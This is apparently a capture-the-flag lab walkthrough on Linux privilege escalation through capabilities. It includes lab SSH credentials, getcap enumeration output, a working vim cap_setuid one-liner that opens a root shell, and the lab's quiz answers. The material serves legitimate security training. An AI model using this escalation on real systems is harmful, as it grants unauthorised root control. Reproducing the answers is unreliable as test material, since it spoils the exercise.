TASK_8
Linux Privilege Escalation > Task 8 "Capabilities"


______ssh creds______
|Username: karen    |
|Password: Password1|
---------------------


Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For instance, we want to use a tool that need to initiate a socket connection but we cant. That is because Capabilities has been set to not allow regular users to initiate such connections.

In order to list the files that Capabilities are set we need getcap tool (its the right time to connect via ssh to the target)
input   :   getcap -r / 2>dev/null
outpt   :   /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
            /usr/bin/traceroute6.iputils = cap_net_raw+ep
            /usr/bin/mtr-packet = cap_net_raw+ep
            /usr/bin/ping = cap_net_raw+ep
            /home/karen/vim = cap_setuid+ep
            /home/ubuntu/view = cap_setuid+ep
Tip     :   "2>/dev/null" sends the errors to /dev/null in order not to be printed into the terminal as it can print a vast amount of those!
As we can see we have 6 tools that capabilities are set (so the answer for the first question is 6). From those only vim and view are capable of opening root shell via GTFOBins (so the answer for the second question is view)

Flip a coin and choose the tool! I will go with vim!
input   :   ./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
outpt   :   //Root Shell opens. Hit "whoami" to verify you are root
Tip     :   I have set python version 3 in order to make the command run

Now lets find the flag
input   :   cat <PATH_TO_FLAG>
outpt   :   <FLAG>.txt


made by @gr1m.r34p3r1337
